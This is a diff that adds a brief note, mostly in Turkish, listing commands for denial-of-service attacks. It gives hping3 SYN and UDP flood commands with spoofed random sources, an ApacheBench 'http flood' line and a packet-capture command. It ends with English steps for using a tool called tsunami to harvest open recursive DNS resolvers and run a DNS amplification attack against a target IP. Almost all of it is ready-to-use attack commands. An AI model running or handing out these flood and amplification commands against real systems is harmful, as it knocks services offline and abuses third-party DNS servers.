@@ -1,0 +1,27 @@
+ddos icin komutlar:
+hping3 -S -p <ip adress> --flood =syn flood
+hping3 -i u1 -S -p 80 -c 10  192.168.1.1 
+hping3 -c 20000 -d 120 -S -w 64 -p TARGET_PORT --flood --rand-source TARGET_SITE
+hping3 --flood --rand-source --udp -p TARGET_PORT TARGET_IP //udp pakeki 
+-------------------------------------------------------------------------------------------
+http flood : ab -n 10 -c 5 <hedef>
+
+------------------------------------------------------------------------------------------
+tcpdump -i eth0 src host <ip adresleri>
+--------------------------------------------------------------------------------------------
+bayraklar:
+-p:
+PA = PUSH ACK PAKETI 
+F = FIN PAKETI
+R = RST PAKETI
+---------------------------------------------------------------------------------------------
+
+Tsunami can be used for DNS amplification attacks. First, you should collect recursive DNS servers:
+
+./tsunami -o recursive_dns.txt -l 4 -e 172.0.0.0/8
+Then you can attack your target with using these DNS servers as an amplifier.
+
+./tsunami -s TARGET_IP -n pentest.blog -p 3 -f recursive_dns.txt
+
+
+
